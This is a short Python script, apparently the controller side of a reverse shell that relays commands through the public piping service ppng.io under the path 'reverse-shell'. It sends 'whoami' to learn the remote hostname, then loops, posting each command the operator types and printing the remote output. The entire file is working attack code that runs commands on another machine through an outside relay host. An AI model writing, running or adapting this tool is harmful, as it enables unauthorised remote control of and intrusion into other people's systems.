import requests

link = 'reverse-shell'

r = requests.get(f"https://ppng.io/{link}")
print(r.text)

requests.post(f"https://ppng.io/{link}", data=str.encode("whoami"))
hostname = requests.get(f"https://ppng.io/{link}").text.removesuffix("\r\n")

while True:
    x = input(f"[{hostname}] -> ")
    requests.post(f"https://ppng.io/{link}", data=str.encode(x))
    response = requests.get(f"https://ppng.io/{link}").text
    print(response)



